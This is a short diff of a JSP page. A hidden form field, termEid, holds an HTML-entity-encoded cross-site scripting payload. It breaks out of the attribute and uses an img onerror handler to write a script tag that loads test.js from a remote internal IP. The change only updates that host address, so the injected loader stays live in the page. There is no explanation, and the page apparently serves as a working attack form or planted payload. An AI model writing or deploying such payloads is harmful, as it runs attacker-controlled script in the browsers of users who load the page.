@@ -27,7 +27,7 @@ String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.
     	<input type="hidden" name="type" value="active">
     	<input type="hidden" name="siteId" value="公共政策与管理学院">
     	<input type="hidden" name="searchText" value="">
-    	<input type="hidden" name="termEid" value="&quot;&gt;&lt;img src=a onerror=&quot;document.write(&#x27;&lt;&#x27;);document.write(&#x27;script src=http://10.202.13.156:8080/IRS_news/js/test.js&gt;&lt;/Script&gt;&#x27;)&quot;&gt;">
+    	<input type="hidden" name="termEid" value="&quot;&gt;&lt;img src=a onerror=&quot;document.write(&#x27;&lt;&#x27;);document.write(&#x27;script src=http://10.202.14.167:8080/IRS_news/js/test.js&gt;&lt;/Script&gt;&#x27;)&quot;&gt;">
 		<!-- <button type="submit">click me!</button> -->
     </form>
   	<iframe id="mainContent" name="mainContent" scrolling="auto" style="height: 807px;" width="100%" height="100%" frameborder="0">
